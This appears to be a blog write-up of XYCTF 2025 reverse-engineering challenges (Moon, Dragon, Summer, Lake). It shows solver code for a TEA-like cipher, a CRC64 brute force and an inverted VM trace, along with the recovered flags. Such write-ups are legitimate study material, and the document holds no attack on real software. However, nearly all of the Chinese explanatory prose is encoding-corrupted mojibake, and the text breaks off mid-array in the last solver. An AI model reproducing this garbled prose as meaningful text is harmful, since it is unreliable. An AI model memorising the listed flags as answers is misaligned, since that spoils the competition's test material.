tmp);</span><br><span class="line">        v0 -= tmp2;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> key[]&#123;</span><br><span class="line">        <span class="number">0x776f6853</span>,</span><br><span class="line">        <span class="number">0x656b616d</span>,</span><br><span class="line">        <span class="number">0x616d5f72</span>,</span><br><span class="line">        <span class="number">0x74696564</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> Encflag[<span class="number">8</span>] = &#123;</span><br><span class="line">        <span class="number">0x696C2E9A</span>, <span class="number">0x76ADE8E1</span>, <span class="number">0xE67D5CA4</span>, <span class="number">0x5C76BD38</span>,</span><br><span class="line">        <span class="number">0xB7AC0787</span>, <span class="number">0xBFEA0C65</span>, <span class="number">0x01C2FF10</span>, <span class="number">0x6D16FD38</span>&#125;;</span><br><span class="line">    <span class="built_in">decipher</span>(Encflag, key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span> *)((<span class="type">uint64_t</span>)Encflag + <span class="number">8</span>), key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span> *)((<span class="type">uint64_t</span>)Encflag + <span class="number">16</span>), key);</span><br><span class="line">    <span class="built_in">decipher</span>((<span class="type">uint32_t</span> *)((<span class="type">uint64_t</span>)Encflag + <span class="number">24</span>), key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, Encflag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XYCTF{fun_un1c0rn_with_4rm64_VM}</p><h2 id="Moon"><a href="#Moon" class="headerlink" title="Moon"></a>Moon</h2><p>è·Ÿåˆ°moon.xor_cryptå®é™…åŠ å¯†å¤„ã€‚</p><p><img src="/2025/04/07/XYCTF2025/6.png"></p><p>å‘ç°æ˜¯è¿›è¡Œäº†å•æ¬¡xorï¼Œå¹¶åŠ å…¥åˆ°ä¸€ä¸ªlistä¸­ï¼Œå‰åè¿‡ç¨‹ä¸æ¸…æ¥šã€‚</p><p>æ–­åœ¨xorè¿™ä¸ªå‘½ä»¤ï¼Œè¿è¡Œé™„åŠ è°ƒè¯•ï¼Œéšä¾¿è¾“å…¥ä¸€ä¸²1</p><p><img src="/2025/04/07/XYCTF2025/7.png"></p><p><img src="/2025/04/07/XYCTF2025/8.png"></p><p>å‘ç°æ˜¯è¾“å…¥çš„â€™1â€™å’Œä¸€ä¸ª0x24è¿›è¡Œxorï¼Œå¤šè¿è¡Œå‡ æ¬¡å‘ç°å°±æ˜¯å°†è¾“å…¥çš„å­—ç¬¦ä¸²éƒ½å¼‚æˆ–ä¸Šä¸€äº›å€¼ã€‚</p><p>ç›´æ¥æ–­åœ¨returnå¤„ï¼Œv20æ˜¯æœ€åå°†listè½¬æˆBytesçš„ç»“æœã€‚</p><p><img src="/2025/04/07/XYCTF2025/9.png"></p><p>å‘ç°æ˜¯28é•¿åº¦çš„ä¸€ä¸²å­—èŠ‚ï¼Œä»0x15å¼€å§‹çš„ï¼Œå°±æ˜¯æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ä»¥åŠå¼‚æˆ–å®Œçš„ç»“æœã€‚</p><p><img src="/2025/04/07/XYCTF2025/10.png"></p><p>ç»§ç»­è¿è¡Œä¼šè¿”å›åˆ°check_flagä»£ç å¤„ï¼Œåº•ä¸‹æœ‰ä¸€ä¸ªRichCompareæ¯”è¾ƒä¸¤ä¸ªæ•°æ®ã€‚</p><p><img src="/2025/04/07/XYCTF2025/11.png"></p><p>v45å¯ä»¥çœ‹åˆ°å°±æ˜¯å°†åˆšåˆšv20çš„bytesç›´æ¥unhexè½¬æˆäº†ä¸€ä¸²å­—ç¬¦ä¸²ã€‚</p><p><img src="/2025/04/07/XYCTF2025/12.png"></p><p>é‚£ä¹ˆv9å°±åº”è¯¥æ˜¯flagçš„å¯†æ–‡ï¼Œå¯ä»¥æ•°å‡ºä¸€å…±æ˜¯è¦35å­—èŠ‚ã€‚</p><p><img src="/2025/04/07/XYCTF2025/13.png"></p><p>é‡æ–°è°ƒè¯•è¿è¡Œè¾“å…¥35ä¸ª1ï¼Œåœ¨check_flagå¼€å¤´æ–­ç‚¹ï¼ŒæŠŠè¾“å…¥çš„å­—ç¬¦ä¸²å…¨éƒ½patchæˆ0ã€‚</p><p><img src="/2025/04/07/XYCTF2025/14.png"></p><p><img src="/2025/04/07/XYCTF2025/15.png"></p><p><img src="/2025/04/07/XYCTF2025/16.png"></p><p>æœ€ååœ¨RichCompareå¤„å°±å¯ä»¥å¾—åˆ°xorå¯†æ–‡çš„åˆ—è¡¨ã€‚</p><p><img src="/2025/04/07/XYCTF2025/17.png"></p><p>å°†v9çš„å¯†æ–‡ä¸è¿™ä¸ªæ•°æ®è¿›è¡Œxorå³å¯å¾—åˆ°flagã€‚</p><p><img src="/2025/04/07/XYCTF2025/18.png"></p><p>flag{but_y0u_l00k3d_up_@t_th3_mOOn}</p><h2 id="Dragonï¼ˆ5m10v3å¸ˆå‚…è§£é¢˜ï¼‰"><a href="#Dragonï¼ˆ5m10v3å¸ˆå‚…è§£é¢˜ï¼‰" class="headerlink" title="Dragonï¼ˆ5m10v3å¸ˆå‚…è§£é¢˜ï¼‰"></a>Dragonï¼ˆ5m10v3å¸ˆå‚…è§£é¢˜ï¼‰</h2><p>.bc åç¼€ </p><p>åç¼–è¯‘ä¸ºLLVM IR</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llvm-dis-<span class="number">17</span> Dragon.bc -o Dragon.ll</span><br></pre></td></tr></table></figure><p>åˆ†æå¾—çŸ¥ä¸ºcrc64ï¼Œä»¥ä¸¤ä¸ªä¸ºä¸€ç»„è¿›è¡Œæ ¡éªŒï¼Œç›´æ¥çˆ†ç ´å°±è¡Œ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">calculate_crc64_direct</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">uint64_t</span> length)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> crc = <span class="number">0xFFFFFFFFFFFFFFFFULL</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint64_t</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">        crc ^= ((<span class="type">uint64_t</span>)data[i] &lt;&lt; <span class="number">56</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">uint64_t</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (crc &amp; <span class="number">0x8000000000000000ULL</span>) &#123; </span><br><span class="line">                crc = (crc &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x42F0E1EBA9EA3693ULL</span>; </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                crc = crc &lt;&lt; <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ~crc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> enc[<span class="number">12</span>] = &#123;</span><br><span class="line">       <span class="number">-2565957437423125689</span>, </span><br><span class="line">        <span class="number">224890624719110086</span>, </span><br><span class="line">        <span class="number">1357324823849588894</span>, </span><br><span class="line">        - <span class="number">8941695979231947288</span>, </span><br><span class="line">        - <span class="number">253413330424273460</span>, </span><br><span class="line">        - <span class="number">7817463785137710741</span>, </span><br><span class="line">        - <span class="number">5620500441869335673</span>, </span><br><span class="line">        <span class="number">984060876288820705</span>, </span><br><span class="line">        - <span class="number">6993555743080142153</span>, </span><br><span class="line">        - <span class="number">7892488171899690683</span>, </span><br><span class="line">        <span class="number">7190415315123037707</span>, </span><br><span class="line">        - <span class="number">7218240302740981077</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">25</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">int</span> flag_index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">12</span>; k++) &#123;</span><br><span class="line">        <span class="type">uint64_t</span> target_crc = enc[k];</span><br><span class="line">        <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> c1 = <span class="number">32</span>; c1 &lt; <span class="number">127</span> &amp;&amp; !found; c1++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">char</span> c2 = <span class="number">32</span>; c2 &lt; <span class="number">127</span> &amp;&amp; !found; c2++) &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">char</span> test[<span class="number">2</span>] = &#123; c1, c2 &#125;;</span><br><span class="line">                <span class="type">uint64_t</span> crc = <span class="built_in">calculate_crc64_direct</span>(test, <span class="number">2</span>);</span><br><span class="line">                <span class="keyword">if</span> (crc == target_crc) &#123;</span><br><span class="line">                    flag[flag_index++] = c1;</span><br><span class="line">                    flag[flag_index++] = c2;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    flag[flag_index] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted flag: %s\n&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;LLVM_1s_Fun_Ri9h7?&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Summerï¼ˆ5m10v3å¸ˆå‚…è§£é¢˜ï¼‰"><a href="#Summerï¼ˆ5m10v3å¸ˆå‚…è§£é¢˜ï¼‰" class="headerlink" title="Summerï¼ˆ5m10v3å¸ˆå‚…è§£é¢˜ï¼‰"></a>Summerï¼ˆ5m10v3å¸ˆå‚…è§£é¢˜ï¼‰</h2><p>haskellç¨‹åº</p><p>å‡½æ•°å¼ç¼–ç¨‹è¯­è¨€,è¿™æ„å‘³ç€ä¸€åˆ‡éƒ½æ˜¯æƒ°æ€§è®¡ç®—ï¼Œä»€ä¹ˆæ˜¯æƒ°æ€§è®¡ç®—ï¼Ÿ ç®€å•æ¥è¯´å°±æ˜¯åœ¨è°ƒç”¨ä¹‹å‰ä¸ä¼šå¯¹è¯¥å€¼è¿›è¡Œè®¡ç®—</p><p>æµè§ˆ main å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ° hs_main å°† ZCMain_main_closure ä½œä¸ºå®ƒçš„å‚æ•°ï¼Œå®ƒæŒ‡å‘ haskell ç¨‹åºçš„çœŸæ­£å…¥å£ç‚¹</p><p><img src="/2025/04/07/XYCTF2025/31.png"></p><p>ZCMain_main_closureé‡Œé¢æˆ‘ä»¬å‘ç°å®ƒè°ƒç”¨äº†stg_ap_p_fastï¼Œè¿™ä¸ªæ˜¯åº•å±‚å‡½æ•°ï¼Œä¸»è¦è°ƒç”¨Main_main_closureè¿™ä¸ªå‡½æ•°</p><p><img src="/2025/04/07/XYCTF2025/19.png"></p><p>GHCziInternalziBaseä¹Ÿæ˜¯åº•å±‚å‡½æ•°ï¼Œä¸»è¦å…³æ³¨ä¸¤ä¸ªå‚æ•°</p><p><img src="/2025/04/07/XYCTF2025/20.png"></p><p>ç¬¬ä¸€ä¸ªå‚æ•°çš„åœ°å€å¤„çš„å‡½æ•°ä¸ºæ‰“å°å­—ç¬¦ä¸²</p><p><img src="/2025/04/07/XYCTF2025/21.png"></p><p><img src="/2025/04/07/XYCTF2025/22.png"></p><p>GHCziInternalziList_length ä¸ºå¤„ç†æˆ‘ä»¬çš„ä¼ å…¥çš„å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œç›´æ¥è°ƒç”¨çš„æ˜¯zdwlenAcc**ï¼Œ**zdwlenAcc å°†é€šè¿‡æ£€æŸ¥ä¸‹ä¸€ä¸ªæ˜¯å¦æ˜¯åˆ—è¡¨çš„æœ«å°¾æ¥è®¡ç®— â€œflagTableâ€ çš„é•¿åº¦ï¼ˆè¿™é‡Œçš„â€flagTableâ€ æ˜¯æˆ‘è‡ªå·±å‘½å,å…¶å®å°±æ˜¯å­˜å‚¨æƒ°æ€§åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®æƒ°æ€§åˆ—è¡¨çš„æŒ‡é’ˆæ•°åˆ¤æ–­å­—ç¬¦ä¸²çš„é•¿åº¦ï¼‰</p><p><img src="/2025/04/07/XYCTF2025/23.png"></p><p><img src="/2025/04/07/XYCTF2025/24.png"></p><p>æˆ‘ä»¬è¿™é‡Œå°±ç”¨flagè¿›è¡Œæµ‹è¯•ï¼Œä¸€æ–¹é¢æ˜¯ä¸ºäº†æŸ¥çœ‹ä»–çš„è¿”å›å€¼</p><p><img src="/2025/04/07/XYCTF2025/25.png"></p><p>æ­¤æ—¶ä»–æ˜¯å°†rbxæ­¤å¤„(å³ä¸ºæƒ°æ€§åˆ—è¡¨çš„æœ«å°¾)ï¼Œå¯ä»¥äººå·¥æ•°(å³ä¸º50)</p><p><img src="/2025/04/07/XYCTF2025/26.png"></p><p>å¦å¤–ä¸€ç§ä¸ºçœ‹è¿”å›å€¼ï¼Œç¬¬ä¸€æ¬¡æ–­ä¸‹æ˜¯è¿”å›æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œç¬¬äºŒæ¬¡æ–­ä¸‹æ˜¯è¿”å›å¯†é’¥çš„é•¿åº¦ï¼Œç¬¬ä¸‰æ¬¡æ–­ä¸‹æ˜¯è¿”å›å¯†æ–‡çš„é•¿åº¦</p><p><img src="/2025/04/07/XYCTF2025/27.png"></p><p><img src="/2025/04/07/XYCTF2025/28.png"></p><p><img src="/2025/04/07/XYCTF2025/29.png"></p><p>å¦å¤–ä¸€å¤„ä¸ºGHCziInternalziNum_zdfNumIntzuzdczpï¼Œè¿™ä¸ªä¹Ÿæ˜¯åœ¨ç½‘ä¸Šä¸€ç¯‡æ–‡ç« çœ‹åˆ°çš„,åœ¨<strong>add     rbx, [rax]</strong> åœ¨ç»è¿‡å‡ æ¬¡è¿­ä»£åï¼Œæˆ‘å¯ä»¥çœ‹åˆ°ä¸€äº›å­—ç¬¦å¼€å§‹å‡ºç°ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥å¾—åˆ°å¯†é’¥ä¸º<strong>Klingsorâ€™s_Last_Summer</strong></p><p><img src="/2025/04/07/XYCTF2025/30.png"></p><p>æˆ‘ä»¬åœ¨.dataæ®µå¾—åˆ°äº†å¯†é’¥ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥çŒœæµ‹ä¸‹é¢å¯èƒ½ä¸ºå¯†æ–‡,å¹¶ä¸”ä¸‹é¢éƒ½æ˜¯æŒ‡é’ˆ+å…ƒç´ çš„å­˜å‚¨å½¢å¼</p><p><img src="/2025/04/07/XYCTF2025/32.png"></p><p><img src="/2025/04/07/XYCTF2025/33.png"></p><p>ç„¶åé€šè¿‡CEè°ƒè¯•å¾—åˆ°æ˜æ–‡å’Œå¯†æ–‡ï¼Œç„¶åå¾—å‡ºä¸ºrc4+xor</p><p><img src="/2025/04/07/XYCTF2025/34.png"></p><p><img src="/2025/04/07/XYCTF2025/35.png"></p><p>flag{Us3_H@sk3ll_t0_f1nd_th3_truth_1n_th1s_Summ3R}</p><h2 id="Lake"><a href="#Lake" class="headerlink" title="Lake"></a>Lake</h2><p>å•æ­¥è·Ÿåˆ°ä¸»å‡½æ•°ã€‚</p><p><img src="/2025/04/07/XYCTF2025/36.png"></p><p>è¿™è¾¹è¾“å…¥å­—ç¬¦ä¸²åå…ˆèµ‹å€¼åˆ°äº†å¦ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åè¿›è¡Œäº†ä¸€æ¬¡ç®€æ˜“VMè®¡ç®—è¿›è¡Œäº†ç¬¬ä¸€æ¬¡åŠ å¯†ï¼Œ</p><p><img src="/2025/04/07/XYCTF2025/37.png"></p><p>ç„¶åæ¥ç€ç¬¬äºŒæ¬¡åŠ å¯†ï¼Œæœ€åå¾ªç¯æ¯”è¾ƒã€‚</p><p><img src="/2025/04/07/XYCTF2025/38.png"></p><p><img src="/2025/04/07/XYCTF2025/39.png"></p><p>å‘ç°VMåªç”¨åˆ°äº†åŠ å‡å’ŒXORè®¡ç®—ï¼Œåœ¨è¿™ä¸‰ä¸ªåœ°æ–¹çš„å…³é”®ç‚¹æ‰“æ–­ç‚¹ï¼Œè¾“å‡ºå¯„å­˜å™¨å’Œè®¡ç®—æµç¨‹ï¼Œè¿™è¾¹ä¸ºäº†æ–¹ä¾¿ç›´æ¥å¤åˆ¶åˆ°ä»£ç é‡Œé¢è§£å¯†ï¼Œå°†åŠ å‡æ–­ç‚¹é‡Œé¢çš„è¾“å‡ºè¿ç®—ç¬¦åè¿‡æ¥ï¼Œè¾“å‡ºå‡ºæ¥çš„ä»£ç ç›´æ¥å¤åˆ¶åˆ°ä»£ç å°±æ˜¯è¿›è¡Œè§£å¯†çš„æµç¨‹ã€‚</p><p><img src="/2025/04/07/XYCTF2025/40.png"></p><p><img src="/2025/04/07/XYCTF2025/41.png"></p><p><img src="/2025/04/07/XYCTF2025/42.png"></p><p>è°ƒè¯•è¾“å‡ºï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Input[<span class="number">2</span>] += <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">26</span>] -= <span class="number">85</span>;</span><br><span class="line">Input[<span class="number">35</span>] -= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">14</span>] += <span class="number">9</span>;</span><br><span class="line">Input[<span class="number">27</span>] -= <span class="number">6</span>;</span><br><span class="line">Input[<span class="number">6</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span class="number">1</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span class="number">27</span>] += <span class="number">14</span>;</span><br><span class="line">Input[<span class="number">25</span>] += <span class="number">3</span>;</span><br><span class="line">Input[<span class="number">26</span>] += <span class="number">4</span>;</span><br><span class="line">Input[<span class="number">4</span>] ^= <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">3</span>] -= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">12</span>] += <span class="number">10</span>;</span><br><span class="line">Input[<span class="number">37</span>] -= <span class="number">2</span>;</span><br><span class="line">Input[<span class="number">32</span>] -= <span class="number">2</span>;</span><br><span class="line">Input[<span class="number">9</span>] -= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">26</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span class="number">4</span>] += <span class="number">13</span>;</span><br><span class="line">Input[<span class="number">8</span>] ^= <span class="number">15</span>;</span><br><span class="line">Input[<span class="number">10</span>] += <span class="number">14</span>;</span><br><span class="line">Input[<span class="number">16</span>] -= <span class="number">7</span>;</span><br><span class="line">Input[<span class="number">12</span>] -= <span class="number">7</span>;</span><br><span class="line">Input[<span class="number">34</span>] ^= <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">21</span>] ^= <span class="number">10</span>;</span><br><span class="line">Input[<span class="number">39</span>] -= <span class="number">126</span>;</span><br><span class="line">Input[<span class="number">7</span>] += <span class="number">2</span>;</span><br><span class="line">Input[<span class="number">15</span>] ^= <span class="number">3</span>;</span><br><span class="line">Input[<span class="number">10</span>] ^= <span class="number">10</span>;</span><br><span class="line">Input[<span class="number">34</span>] -= <span class="number">11</span>;</span><br><span class="line">Input[<span class="number">18</span>] += <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">25</span>] += <span class="number">9</span>;</span><br><span class="line">Input[<span class="number">14</span>] ^= <span class="number">6</span>;</span><br><span class="line">Input[<span class="number">0</span>] ^= <span class="number">5</span>;</span><br><span class="line">Input[<span class="number">10</span>] -= <span class="number">8</span>;</span><br><span class="line">Input[<span class="number">27</span>] ^= <span class="number">7</span>;</span><br><span class="line">Input[<span class="number">13</span>] ^= <span class="number">6</span>;</span><br><span class="line">Input[<span class="number">13</span>] ^= <span class="number">4</span>;</span><br><span class="line">Input[<span class="number">23</span>] ^= <span class="number">12</span>;</span><br><span class="line">Input[<span class="number">34</span>] ^= <span class="number">14</span>;</span><br><span class="line">Input[<span class="number">18</span>] += <span class="number">52</span>;</span><br><span class="line">Input[<span class="number">38</span>] -= <span class="number">119</span>;</span><br></pre></td></tr></table></figure><p>è¿™ä¹Ÿå°±æ˜¯ç¬¬ä¸€å±‚åŠ å¯†çš„è§£å¯†ä»£ç ã€‚</p><p>ç¬¬äºŒå±‚åŠ å¯†ç›´æ¥å¯¹ç€å†™å³å¯ï¼Œæˆ‘å†™çš„æœ‰ç‚¹é—®é¢˜ï¼ˆæ‡’å¾—æ”¹ï¼‰ï¼Œå…¶ä¸­å‡ ä¸ªå­—èŠ‚è§£å¯†ä¸å¯¹ï¼Œä¸è¿‡æ ¹æ®è§£å¯†å‡ºçš„flagä¹Ÿèƒ½çŒœå‡ºæ˜¯å•¥ï¼Œæ›¿æ¢å®Œé‚£å‡ ä¸ªå­—èŠ‚å°±å¾—åˆ°å®Œæ•´çš„flagã€‚</p><p>å®Œæ•´è§£å¯†ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt_func</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp[<span class="number">40</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(temp, data, <span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> base = <span class="number">4</span> * i;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> block[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (base &lt; len)</span><br><span class="line">        &#123;</span><br><span class="line">            block[<span class="number">0</span>] = ((temp[base + <span class="number">2</span>] &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">5</span>) | (temp[base + <span class="number">3</span>] &gt;&gt; <span class="number">3</span>);</span><br><span class="line">            block[<span class="number">1</span>] = (temp[base] &gt;&gt; <span class="number">3</span>) | ((temp[base + <span class="number">3</span>] &amp; <span class="number">0x07</span>) &lt;&lt; <span class="number">5</span>);</span><br><span class="line">            block[<span class="number">2</span>] = ((temp[base] &amp; <span class="number">0x07</span>) &lt;&lt; <span class="number">5</span>) | (temp[base + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>);</span><br><span class="line">            block[<span class="number">3</span>] = ((temp[base + <span class="number">1</span>] &amp; <span class="number">0x07</span>) &lt;&lt; <span class="number">5</span>) | (temp[base + <span class="number">2</span>] &gt;&gt; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span> &amp;&amp; base + j &lt; len; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                data[base + j] = block[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Input[<span class="number">48</span>] = &#123;</span><br><span class="line">        <span class="number">0x4A</span>, <span class="number">0xAB</span>, <span class="number">0x9B</span>, <span class="number">0x1B</span>, <span class="number">0x61</span>, <span class="number">0xB1</span>, <span class="number">0xF3</span>, <span class="number">0x32</span>, <span class="number">0xD1</span>, <span class="number">0x8B</span>, <span class="number">0x73</span>, <span class="number">0xEB</span>, <span class="number">0xE9</span>, <span class="number">0x73</span>, <span class="number">0x6B</span>, <span 